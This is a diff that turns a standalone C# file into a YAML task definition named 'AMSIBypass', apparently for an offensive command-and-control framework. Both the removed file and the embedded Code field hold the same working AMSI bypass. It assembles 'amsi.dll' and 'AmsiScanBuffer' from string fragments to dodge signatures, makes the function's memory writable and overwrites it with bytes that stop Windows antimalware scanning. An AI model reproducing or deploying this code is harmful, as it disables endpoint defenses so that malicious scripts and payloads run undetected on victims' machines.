@@ -1,96 +1,39 @@
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public static class Task
-{
-    
-    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-
-    public static string Execute()
-    {
-        if (is64Bit())
-        {
-            lulukids(x64);
-            return "64 bit Successful";
-        }
-        else
-        {
-            lulukids(x86);
-            return "32 bit Successful";
-        }
-
-    }
-
-    private static string lulukidsdll
-    {
-        get
-        {
-            var sb = new StringBuilder(@"a");
-            sb.Append(@"m");
-            sb.Append(@"s");
-            sb.Append(@"i");
-            sb.Append(@".");
-            sb.Append(@"d");
-            sb.Append(@"ll");
-            return sb.ToString();
-        }
-    }
-
-    private static string lulukidsbuf
-    {
-        get
-        {
-            var sb = new StringBuilder(@"A");
-            sb.Append(@"m");
-            sb.Append(@"s");
-            sb.Append(@"i");
-            sb.Append(@"S");
-            sb.Append(@"c");
-            sb.Append(@"an");
-            sb.Append(@"B");
-            sb.Append(@"u");
-            sb.Append(@"ff");
-            sb.Append(@"e");
-            sb.Append(@"r");
-            return sb.ToString();
-        }
-    }
-    private static void lulukids(byte[] patch)
-    {
-
-        
-        var lib = Win32.LoadLibrary(lulukidsdll);
-        var addr = Win32.GetProcAddress(lib, lulukidsbuf);
-
-        uint oldProtect;
-        Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
-
-        Marshal.Copy(patch, 0, addr, patch.Length);
-
-
-    }
-
-    private static bool is64Bit()
-    {
-        bool is64Bit = true;
-
-        if (IntPtr.Size == 4)
-            is64Bit = false;
-
-        return is64Bit;
-    }
-}
-
-class Win32
-{
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
+- Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Name: AMSIBypass
+  Aliases: []
+  Description: AMSIBypass
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Runtime.InteropServices;\nusing System.Text;\n\npublic static class Task\n{\n    \n    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };\n\n    public static string Execute()\n    {\n        if (is64Bit())\n        {\n            lulukids(x64);\n            return \"64 bit Successful\";\n        }\n        else\n        {\n            lulukids(x86);\n            return \"32 bit Successful\";\n        }\n\n    }\n\n    private static string lulukidsdll\n    {\n        get\n        {\n            var sb = new StringBuilder(@\"a\");\n            sb.Append(@\"m\");\n            sb.Append(@\"s\");\n            sb.Append(@\"i\");\n            sb.Append(@\".\");\n            sb.Append(@\"d\");\n            sb.Append(@\"ll\");\n            return sb.ToString();\n        }\n    }\n\n    private static string lulukidsbuf\n    {\n        get\n        {\n            var sb = new StringBuilder(@\"A\");\n            sb.Append(@\"m\");\n            sb.Append(@\"s\");\n            sb.Append(@\"i\");\n            sb.Append(@\"S\");\n            sb.Append(@\"c\");\n            sb.Append(@\"an\");\n            sb.Append(@\"B\");\n            sb.Append(@\"u\");\n            sb.Append(@\"ff\");\n            sb.Append(@\"e\");\n            sb.Append(@\"r\");\n            return sb.ToString();\n        }\n    }\n    private static void lulukids(byte[] patch)\n    {\n\n        \n        var lib = Win32.LoadLibrary(lulukidsdll);\n        var addr = Win32.GetProcAddress(lib, lulukidsbuf);\n\n        uint oldProtect;\n        Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);\n\n        Marshal.Copy(patch, 0, addr, patch.Length);\n\n\n    }\n\n    private static bool is64Bit()\n    {\n        bool is64Bit = true;\n\n        if (IntPtr.Size == 4)\n            is64Bit = false;\n\n        return is64Bit;\n    }\n}\n\nclass Win32\n{\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}"
+  Compiled: false
+  TaskingType: Assembly
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: System.Core.dll
+    Location: net40/System.Core.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
